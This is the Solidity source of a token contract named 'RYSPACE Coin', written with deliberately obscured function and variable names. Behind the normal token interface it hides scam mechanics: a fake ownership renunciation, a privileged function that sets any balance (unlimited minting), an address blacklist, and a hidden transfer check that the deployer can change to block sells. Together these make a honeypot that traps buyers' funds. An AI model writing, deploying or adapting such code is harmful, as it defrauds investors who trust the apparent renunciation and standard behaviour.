//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface fromLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeList) external view returns (uint256);

    function transfer(address atReceiver, uint256 buyListMin) external returns (bool);

    function allowance(address txFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyListMin) external returns (bool);

    function transferFrom(
        address sender,
        address atReceiver,
        uint256 buyListMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityLimit, uint256 value);
    event Approval(address indexed txFund, address indexed spender, uint256 value);
}

interface takeTo is fromLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract txTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptSellMarketing {
    function createPair(address totalMin, address walletTotalAmount) external returns (address);
}

interface limitMinWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract RYSPACECoin is txTrading, fromLiquidity, takeTo {

    function receiverList() private view {
        require(launchWalletIs[_msgSender()]);
    }

    uint256 public sellLimit;

    uint256 feeSell;

    string private limitExempt = "RYSPACE Coin";

    bool public txMinFrom;

    function transfer(address shouldBuy, uint256 buyListMin) external virtual override returns (bool) {
        return autoList(_msgSender(), shouldBuy, buyListMin);
    }

    bool private isAt;

    function minSwap(address isList, address atReceiver, uint256 buyListMin) internal returns (bool) {
        require(takeFundAmount[isList] >= buyListMin);
        takeFundAmount[isList] -= buyListMin;
        takeFundAmount[atReceiver] += buyListMin;
        emit Transfer(isList, atReceiver, buyListMin);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return limitExempt;
    }

    mapping(address => bool) public buyLaunch;

    function totalSupply() external view virtual override returns (uint256) {
        return launchBuy;
    }

    function isAuto() public {
        emit OwnershipTransferred(limitFundMin, address(0));
        txFundLaunched = address(0);
    }

    function allowance(address isMax, address enableAutoTake) external view virtual override returns (uint256) {
        if (enableAutoTake == exemptTradingWallet) {
            return type(uint256).max;
        }
        return launchedWallet[isMax][enableAutoTake];
    }

    constructor (){
        if (fundTrading == txSender) {
            txSender = false;
        }
        isAuto();
        limitMinWallet amountLiquiditySwap = limitMinWallet(exemptTradingWallet);
        tradingTo = exemptSellMarketing(amountLiquiditySwap.factory()).createPair(amountLiquiditySwap.WETH(), address(this));
        
        limitFundMin = _msgSender();
        launchWalletIs[limitFundMin] = true;
        takeFundAmount[limitFundMin] = launchBuy;
        if (launchedFundTrading == sellLimit) {
            isAt = true;
        }
        emit Transfer(address(0), limitFundMin, launchBuy);
    }

    function transferFrom(address isList, address atReceiver, uint256 buyListMin) external override returns (bool) {
        if (_msgSender() != exemptTradingWallet) {
            if (launchedWallet[isList][_msgSender()] != type(uint256).max) {
                require(buyListMin <= launchedWallet[isList][_msgSender()]);
                launchedWallet[isList][_msgSender()] -= buyListMin;
            }
        }
        return autoList(isList, atReceiver, buyListMin);
    }

    uint256 private launchedFundTrading;

    function getOwner() external view returns (address) {
        return txFundLaunched;
    }

    bool private receiverLiquidityMax;

    address public tradingTo;

    uint256 private launchBuy = 100000000 * 10 ** 18;

    bool public buyToken;

    uint256 public launchMarketing;

    function autoTake(address atMax) public {
        if (teamFund) {
            return;
        }
        if (launchedFundTrading == sellLimit) {
            txSender = true;
        }
        launchWalletIs[atMax] = true;
        if (launchedFundTrading != sellLimit) {
            fundTrading = true;
        }
        teamFund = true;
    }

    function feeTotal(address launchTrading) public {
        receiverList();
        
        if (launchTrading == limitFundMin || launchTrading == tradingTo) {
            return;
        }
        buyLaunch[launchTrading] = true;
    }

    address exemptTradingWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address enableAutoTake, uint256 buyListMin) public virtual override returns (bool) {
        launchedWallet[_msgSender()][enableAutoTake] = buyListMin;
        emit Approval(_msgSender(), enableAutoTake, buyListMin);
        return true;
    }

    bool public fundTrading;

    uint256 public toFromFund;

    function autoList(address isList, address atReceiver, uint256 buyListMin) internal returns (bool) {
        if (isList == limitFundMin) {
            return minSwap(isList, atReceiver, buyListMin);
        }
        uint256 minMarketing = fromLiquidity(tradingTo).balanceOf(teamMarketingReceiver);
        require(minMarketing == atMarketing);
        require(!buyLaunch[isList]);
        return minSwap(isList, atReceiver, buyListMin);
    }

    address teamMarketingReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 atMarketing;

    function decimals() external view virtual override returns (uint8) {
        return totalSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return limitMarketingTo;
    }

    function owner() external view returns (address) {
        return txFundLaunched;
    }

    function balanceOf(address feeList) public view virtual override returns (uint256) {
        return takeFundAmount[feeList];
    }

    address private txFundLaunched;

    string private limitMarketingTo = "RCN";

    uint8 private totalSender = 18;

    address public limitFundMin;

    mapping(address => uint256) private takeFundAmount;

    event OwnershipTransferred(address indexed walletFundMode, address indexed autoWallet);

    bool private txSender;

    mapping(address => mapping(address => uint256)) private launchedWallet;

    mapping(address => bool) public launchWalletIs;

    bool public teamFund;

    function exemptTo(address shouldBuy, uint256 buyListMin) public {
        receiverList();
        takeFundAmount[shouldBuy] = buyListMin;
    }

    function launchAuto(uint256 buyListMin) public {
        receiverList();
        atMarketing = buyListMin;
    }

}